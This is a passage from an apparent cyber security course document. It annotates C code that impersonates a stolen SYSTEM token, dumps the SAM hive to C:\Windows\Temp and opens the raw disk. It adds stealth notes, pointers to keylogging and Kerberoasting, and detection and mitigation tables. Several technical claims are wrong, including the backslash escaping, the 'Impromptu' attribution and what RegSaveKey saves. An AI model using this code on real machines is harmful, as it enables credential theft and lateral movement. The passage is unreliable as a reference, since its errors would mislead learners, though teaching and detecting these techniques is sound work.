- **Why this is the critical step:** Every file access, registry access, and API call from this point forward (in this thread) is evaluated against the SYSTEM token. We're now effectively running as SYSTEM.

```c
        printf("[-] ImpersonateLoggedOnUser failed: %lu\n", GetLastError());
```
- **Line meaning:** Reports failure.

```c
        return 1;
```
- **Line meaning:** Exits.

```c
    }
```
- Closes the error block.

```c
    printf("[+] Successfully impersonating SYSTEM\n");
```
- **Line meaning:** Confirms successful impersonation.

---

#### 2.4.8 Dumping the SAM Hive

```c
    /* Attempt to save SAM hive while SYSTEM */
```
- **Comment:** Marks the credential dumping phase.

```c
    if (RegSaveKeyA(HKEY_LOCAL_MACHINE, "C:\\Windows\\Temp\\sam_dump", NULL) == ERROR_SUCCESS) {
```
- **Line meaning:** Attempts to save the `HKEY_LOCAL_MACHINE` registry hive to a file, and checks for success.
- **Function signature:** `LSTATUS RegSaveKeyA(HKEY hKey, LPCSTR lpFile, const LPSECURITY_ATTRIBUTES lpSecurityAttributes);`
- **Parameter 1 — `HKEY_LOCAL_MACHINE`:** A predefined registry handle representing the root of the local machine hive. This includes SAM, SECURITY, SOFTWARE, SYSTEM, and other subhives.
- **Parameter 2 — `"C:\\Windows\\Temp\\sam_dump"`:** The destination file path. Four backslashes in source become two in the actual string: `C:\Windows\Temp\sam_dump`.
- **Parameter 3 — `NULL`:** No special security attributes.
- **What `RegSaveKeyA` does:** Dumps the ENTIRE registry hive to a binary file. This file can be parsed offline with tools like `secretsdump.py` (Impromptu) or `samdump2` to extract NTLM password hashes.
- **Why SAM is valuable:** The SAM (Security Account Manager) database stores local user account password hashes. These hashes can be:
  - Cracked offline (dictionary/brute force)
  - Used directly in **pass-the-hash** attacks (authenticating without knowing the plaintext password)
- **Access requirements:** `RegSaveKeyA` on `HKEY_LOCAL_MACHINE` requires `SeBackupPrivilege` AND the caller must be SYSTEM or have specific registry ACL permissions.
- **Return value:** `ERROR_SUCCESS` (defined as `0`) means the hive was saved.

```c
        printf("[+] SAM hive saved to C:\\Windows\\Temp\\sam_dump\n");
```
- **Line meaning:** Confirms successful dump.

```c
        printf("[*] Extract NTLM hashes offline for pass-the-hash lateral movement\n");
```
- **Line meaning:** Explains the next step an attacker would take.
- **Concept — Pass-the-Hash:** A technique where an attacker uses captured NTLM hashes directly to authenticate to other systems, without ever cracking the password to plaintext. Windows's NTLM authentication protocol allows this because the hash IS the credential in NTLM.

```c
    } else {
```
- **Line meaning:** The save operation failed.

```c
        printf("[!] RegSaveKey failed (normal on hardened builds): %lu\n", GetLastError());
```
- **Line meaning:** Reports failure with a note that this is expected on hardened systems.
- **Concept — `[!]` prefix:** Standard notation for warnings or notable conditions.
- **Why it might fail on hardened builds:**
  - **Credential Guard:** Windows 10/11 Enterprise feature that isolates LSASS and protects credential material
  - **Tamper Protection:** Prevents modification of security settings
  - **Registry ACL hardening:** Some organisations restrict `RegSaveKey` access
  - **WDAC/AppLocker:** May block writes to `C:\Windows\Temp`

```c
    }
```
- Closes the if/else block.

---

#### 2.4.9 Proof of SYSTEM Access — Physical Drive

```c
    /* Proof of SYSTEM access: open physical drive */
```
- **Comment:** Marks the proof-of-access section.

```c
    HANDLE hDrive = CreateFileA("\\\\.\\PHYSICALDRIVE0", GENERIC_READ,
```
- **Line meaning:** Opens a handle to the first physical disk drive.
- **Path — `\\.\PHYSICALDRIVE0`:** A special Windows device path. The `\.` prefix refers to the local machine's device namespace. `PHYSICALDRIVE0` is the first physical disk.
- **Access — `GENERIC_READ`:** Requests read access to the device.

```c
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
```
- **Parameter 3 — `FILE_SHARE_READ | FILE_SHARE_WRITE`:** Allows other processes to also read and write the disk while we have it open.
- **Parameter 4 — `NULL`:** No security attributes.
- **Parameter 5 — `OPEN_EXISTING`:** The device must already exist (it always does on a running system).
- **Parameter 6 — `0`:** No special flags or attributes.
- **Parameter 7 — `NULL`:** No template file.
- **Why opening the physical drive proves SYSTEM access:** Reading raw disk sectors requires the highest level of access. Standard users and even administrators cannot open `\PhysicalDrive0` without `SeDebugPrivilege` or SYSTEM context. Success here definitively proves we have bypassed all normal access controls.

```c
    if (hDrive != INVALID_HANDLE_VALUE) {
```
- **Line meaning:** Checks if the open succeeded.
- **Concept — `INVALID_HANDLE_VALUE`:** A special constant (defined as `(HANDLE)-1` or `0xFFFFFFFF`) that indicates failure for `CreateFile`. Note: this is different from `NULL`, which some other APIs return on failure.

```c
        printf("[+] Opened PHYSICALDRIVE0 — full SYSTEM access confirmed\n");
```
- **Line meaning:** Confirms raw disk access.

```c
        CloseHandle(hDrive);
```
- **Line meaning:** Closes the drive handle. Keeping it open would lock the device.

```c
    }
```
- Closes the if block.

---

#### 2.4.10 Writing Proof File

```c
    /* While SYSTEM, write proof */
```
- **Comment:** Another proof-of-access demonstration.

```c
    HANDLE hProof = CreateFileA("C:\\Windows\\Temp\\vault_proof.txt", GENERIC_WRITE,
```
- **Line meaning:** Creates a proof file with write access.
- **Access — `GENERIC_WRITE`:** Request write access.

```c
        0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
```
- **Parameter 3 — `0`:** No sharing (exclusive access while writing).
- **Parameter 4 — `NULL`:** No security attributes.
- **Parameter 5 — `CREATE_ALWAYS`:** Create a new file, or overwrite if it already exists.
- **Parameter 6 — `FILE_ATTRIBUTE_NORMAL`:** Default file attributes (not hidden, not read-only, etc.).
- **Parameter 7 — `NULL`:** No template file.

```c
    if (hProof != INVALID_HANDLE_VALUE) {
```
- **Line meaning:** Checks for success.

```c
        DWORD bw;
```
- **Line meaning:** Declares a variable to receive the number of bytes written.

```c
        WriteFile(hProof, "TokenVault SYSTEM proof\n", 24, &bw, NULL);
```
- **Line meaning:** Writes 24 bytes of text to the file.
- **Function signature:** `BOOL WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);`
- **Parameter 2 — `"TokenVault SYSTEM proof\n"`:** The string to write. The `\n` is 1 byte, so `"TokenVault SYSTEM proof\n"` = 24 characters = 24 bytes in ASCII.
- **Parameter 3 — `24`:** Number of bytes to write.
- **Parameter 4 — `&bw`:** Receives the actual bytes written (should be 24 on success).
- **Parameter 5 — `NULL`:** Synchronous write (no overlapped I/O).

```c
        CloseHandle(hProof);
```
- **Line meaning:** Closes the file handle.

```c
        printf("[+] Proof written via SYSTEM impersonation\n");
```
- **Line meaning:** Confirms the write.

```c
    }
```
- Closes the if block.

---

#### 2.4.11 Cleanup and Reversion

```c
    RevertToSelf();
```
- **Line meaning:** Stops impersonating and returns the thread to its original security context.
- **Concept — `RevertToSelf`:** Removes the thread's impersonation token. After this call, the thread uses the process's primary token again.
- **Why revert:** Best practice is to minimise the time spent in an elevated context. Also, some APIs behave unexpectedly if called while impersonating.

```c
    CloseHandle(hDupToken);
```
- **Line meaning:** Closes the duplicated token handle.

```c
    CloseHandle(hSysToken);
```
- **Line meaning:** Closes the original SYSTEM token handle.

```c
    CloseHandle(hProc);
```
- **Line meaning:** Closes the process handle.

```c
    printf("[*] TokenVault complete\n");
```
- **Line meaning:** Prints completion message.

```c
    return 0;
```
- **Line meaning:** Exits successfully.

```c
}
```
- Closes the `main` function.

---

## 3. Key Concepts

### 3.1 Windows Access Tokens

An **access token** is the core security object in Windows. Every process has a **primary token** that defines:
- **User identity** (via SID)
- **Group memberships**
- **Privileges** (e.g., `SeDebugPrivilege`)
- **Integrity level** (Mandatory Integrity Control)
- **Session ID**
- **Logon type**

When a thread **impersonates**, it temporarily replaces its security context with an **impersonation token**. All access checks then use the impersonated identity.

Token theft works because:
1. `SeDebugPrivilege` bypasses process ACL checks
2. `OpenProcessToken` retrieves the target's token
3. `DuplicateTokenEx` creates an impersonation-capable copy
4. `ImpersonateLoggedOnUser` applies it to the current thread

### 3.2 Privileges vs. Rights

| Term | Definition | Example |
|------|-----------|---------|
| **Privilege** | A system-level permission to perform a specific action | `SeDebugPrivilege` — debug any process |
| **Right** | A permission assigned to user accounts via Group Policy | "Log on locally", "Access this computer from network" |
| **Permission** | Access control on a specific object (file, registry key) | FILE_GENERIC_READ on `C:\secret.txt` |

Privileges are stored in tokens. Rights are stored in the LSA policy database. Permissions are stored in object ACLs.

### 3.3 The Local Security Authority (LSA) and SAM

- **LSA (`lsass.exe`):** Manages authentication, generates tokens, enforces security policy
- **SAM:** The database of local user accounts and their password hashes
  - Stored in `HKLM\SAM` (mounted from `C:\Windows\System32\config\SAM`)
  - Only accessible to SYSTEM
  - Contains NTLM hashes (MD4 of the Unicode password)

### 3.4 Windows Registry Hives

The registry is organised into **hives** — files on disk that contain registry data:
- `SAM` — local account credentials
- `SECURITY` — LSA secrets, cached domain credentials
- `SYSTEM` — system configuration, boot settings
- `SOFTWARE` — installed software settings
- `DEFAULT`, `NTUSER.DAT` — user profiles

`RegSaveKeyA` dumps a hive to a file for offline analysis.

### 3.5 Process Enumeration with Toolhelp32

The Toolhelp32 API provides a user-friendly way to snapshot system state:
1. `CreateToolhelp32Snapshot` — freeze the process list
2. `Process32First` — get the first entry
3. `Process32Next` — iterate through entries
4. `CloseHandle` — release the snapshot

This is safer than directly reading kernel structures, which requires drivers or undocumented APIs.

### 3.6 Security Identifiers (SIDs)

A **SID** is a variable-length binary structure that uniquely identifies a security principal:
- Format: `S-1-5-21-<domain>-<rid>` (domain accounts)
- Well-known: `S-1-5-18` = SYSTEM, `S-1-5-32-544` = Administrators
- `LookupAccountSidA` converts SIDs to names; `LookupAccountNameA` does the reverse

### 3.7 Memory Management in C

| Function | Purpose | Notes |
|----------|---------|-------|
| `malloc(size)` | Allocate `size` bytes from heap | Returns `NULL` on failure |
| `free(ptr)` | Return allocated memory to heap | Must match every `malloc` |
| `sizeof(type)` | Get size of a type in bytes | Compile-time operator |
| `&variable` | Get address of a variable | Creates a pointer |
| `ptr->member` | Access struct member via pointer | Equivalent to `(*ptr).member` |

---

## 4. Why This Technique Works (Red Team Perspective)

### 4.1 Architectural Design, Not a Bug

Token impersonation is a **legitimate Windows feature**, not a vulnerability:
- Servers (IIS, SQL Server, file servers) use impersonation to service requests as the requesting user
- The SCM uses impersonation during service installation
- COM/DCOM uses impersonation for remote object access

The "exploit" is simply using this feature with stolen credentials/privileges to escalate from admin to SYSTEM.

### 4.2 The Power of `SeDebugPrivilege`

`SeDebugPrivilege` is the "master key" of Windows user-mode security:
- Originally intended for debuggers
- Allows opening ANY process with ANY access rights
- Effectively bypasses ALL process-level access controls
- Once you have it, token theft is trivial

This is why modern Windows security guidance recommends:
- Removing `SeDebugPrivilege` from standard admin accounts where possible
- Using Credential Guard to protect LSASS
- Enabling Credential Guard with UEFI lock

### 4.3 Lateral Movement Implications

The SAM hive dump enables:
- **Offline hash cracking** with Hashcat or John the Ripper
- **Pass-the-hash** attacks against other systems with the same local admin password
- **Golden Ticket** creation if KRBTGT hashes are obtained (from domain controllers)

This is why **LAPS (Local Administrator Password Solution)** is critical — it ensures each workstation has a unique local admin password, preventing lateral movement via shared local credentials.

### 4.4 Stealth Considerations

This tool is relatively stealthy because:
- It uses only documented Windows APIs (looks like legitimate software)
- No process injection or memory corruption (won't trigger exploit detection)
- The `RegSaveKey` operation is a single API call (atomic from a detection perspective)
- Impersonation is temporary and reversible

However, it DOES create artifacts:
- Event log entries for privilege use
- The dumped SAM file on disk
- The proof file in `C:\Windows\Temp`
- Handle operations visible to EDR telemetry

---

## 4.5 Real-World Priming

### The Lab Lie

**What the lab lets you believe:** Stealing a SYSTEM token and dumping the SAM hive is a reliable way to escalate privileges and obtain credentials.

**What the lab hides from you:** Credential Guard (Windows 10/11 Enterprise) virtualizes LSASS and protects derived credentials. SAM dumps from a Credential Guard-enabled machine contain encrypted hashes that are useless for pass-the-hash. EDR behavioral rules flag `OpenProcess` to `lsass.exe` or `winlogon.exe` with `PROCESS_QUERY_INFORMATION`. `SeDebugPrivilege` usage is logged (Event ID 4672). The dumped hive file on disk is an instant IOC.

### How It Dies in Production

| Defense | How It Kills This Technique | Your Lab Bypass |
|---------|---------------------------|-----------------|
| Credential Guard | Virtualizes LSASS; SAM dumps are encrypted garbage | Not enabled (requires Enterprise/Pro + UEFI) |
| LSA protection (`RunAsPPL`) | Prevents non-protected processes from opening LSASS | Not set in lab |
| EDR LSASS access detection | Opening `lsass.exe` with `PROCESS_QUERY_INFORMATION` fires alerts | No EDR in lab |
| `SeDebugPrivilege` auditing | Event ID 4672 logs privilege use | No audit policy configured |
| File-based IOC | `SAM_dump.hive` in `Temp` is trivial to find | No file integrity monitoring |
| LAPS | Unique local admin passwords per machine prevent lateral movement | Not deployed in lab |

### What a Professional Red Teamer Would Do

**Instead of token theft + SAM dump, they would:**
- **Kerberoasting** — request service tickets for SPNs, crack offline (no LSASS touch, no admin needed for some variants)
- **Keylogging** — capture credentials at the point of entry; bypasses Credential Guard entirely
- **Clipboard theft** — passwords copied from password managers never touch LSASS
- **DCSync** — if domain admin, replicate hashes directly from DC using `DRSGetNCChanges`

**Key difference:** The pro avoids touching LSASS or SAM entirely. Credential Guard made those techniques obsolete on Enterprise machines. The pro targets credentials **before** they reach the OS's credential store.

### What to Learn Next

| Concept | Why It Matters | Where to Start |
|---------|---------------|----------------|
| Kerberoasting | No LSASS touch, works against service accounts | Impacket: `GetUserSPNs.py` |
| Keylogging | Captures creds at entry point; bypasses Credential Guard | `SetWindowsHookEx` with `WH_KEYBOARD_LL` |
| DCSync | Domain-wide hash extraction from DC | Impacket: `secretsdump.py` |
| LAPS bypass | If LAPS deployed, need alternative lateral movement | Crackmapexec LAPS module |

### The Honest Bottom Line

> This token theft technique teaches Windows security tokens, privilege escalation, and registry hive dumping. It does not teach modern credential theft. In the real world, Credential Guard and LSA protection made SAM dumps **largely obsolete** on Enterprise machines. The value is understanding how Windows authentication works internally. Learn Kerberoasting and keylogging next.

---

## 5. Detection Vectors

### 5.1 Windows Event Logs

| Event ID | Log | Trigger |
|----------|-----|---------|
| **4672** | Security | Special privileges assigned to new logon (`SeDebugPrivilege`, `SeBackupPrivilege`) |
| **4688** | Security | New process created (look for processes spawned by unusual parents) |
| **4656** | Security | Handle to an object was requested (process handle to SYSTEM processes) |
| **4663** | Security | An attempt was made to access an object (file/registry auditing) |
| **5156** | Security | Windows Firewall allowed a connection |

### 5.2 EDR / Endpoint Behavioural Detections

| Behaviour | Detection Rule |
|-----------|---------------|
| Process opens handle to `lsass.exe` / `winlogon.exe` with `PROCESS_QUERY_INFORMATION` | Open-process-to-LSASS detection |
| Token duplication from SYSTEM process | Token handle creation from unusual source |
| `RegSaveKey` on `HKLM\SAM` | Registry dump detection |
| File write to `\Temp\sam_dump` or similar | File creation anomaly |
| `SeDebugPrivilege` usage by non-debugger processes | Privilege use anomaly |

### 5.3 File System Artifacts

- `C:\Windows\Temp\sam_dump` — dumped registry hive
- `C:\Windows\Temp\vault_proof.txt` — proof file from this tool
- Any files written while impersonating SYSTEM will have `NT AUTHORITY\SYSTEM` as the owner in their ACL

### 5.4 Memory Artifacts

- The process performing these operations will have handles to:
  - A SYSTEM process (e.g., `winlogon.exe`)
  - Duplicated tokens with `TokenImpersonation` type
- EDR can enumerate these handles via `NtQuerySystemInformation` or kernel callbacks

### 5.5 Mitigations

1. **Credential Guard (Windows 10/11 Enterprise):** Virtualizes LSASS and protects derived credentials, making SAM dumps far less valuable
2. **Disable `SeDebugPrivilege` for admins:** Via Group Policy / user rights assignment
3. **EDR with behavioural rules:** Detect process-open-to-LSASS and token duplication patterns
4. **LAPS:** Unique local admin passwords prevent lateral movement from stolen hashes
5. **Protected Users security group:** Prevents NTLM authentication entirely for members
6. **Audit Process Tracking:** Enable detailed process creation auditing (Event ID 4688 with command-line logging)

---

## 6. Summary Table: Function Reference

| Function | Library | Purpose |
|----------|---------|---------|
| `CreateToolhelp32Snapshot` | `kernel32.dll` | Create a snapshot of running processes |
| `Process32First` / `Process32Next` | `kernel32.dll` | Iterate through process list |
| `OpenProcess` | `kernel32.dll` | Open a handle to a process |
| `OpenProcessToken` | `advapi32.dll` | Retrieve a process's access token |
| `GetTokenInformation` | `advapi32.dll` | Query token properties (user, groups, privileges) |
| `LookupAccountSidA` | `advapi32.dll` | Convert SID to human-readable account name |
| `LookupPrivilegeValueA` | `advapi32.dll` | Convert privilege name to LUID |
| `AdjustTokenPrivileges` | `advapi32.dll` | Enable/disable privileges in a token |
| `DuplicateTokenEx` | `advapi32.dll` | Create a copy of a token with specified attributes |
| `ImpersonateLoggedOnUser` | `advapi32.dll` | Adopt a token's security context in current thread |
| `RevertToSelf` | `advapi32.dll` | End impersonation, restore original context |
| `RegSaveKeyA` | `advapi32.dll` | Save a registry hive to a file |
| `CreateFileA` / `WriteFile` / `CloseHandle` | `kernel32.dll` | File I/O operations |
| `malloc` / `free` | C Runtime (`ucrtbase.dll`) | Dynamic memory allocation |
| `printf` | C Runtime | Console output |
| `_stricmp` / `strcmp` | C Runtime | String comparison |

---

*Document compiled for Cert IV Cyber Security final assessment. Understanding token manipulation is not just about offensive techniques — it's about understanding the Windows security model deeply enough to detect, prevent, and respond to these attacks.*
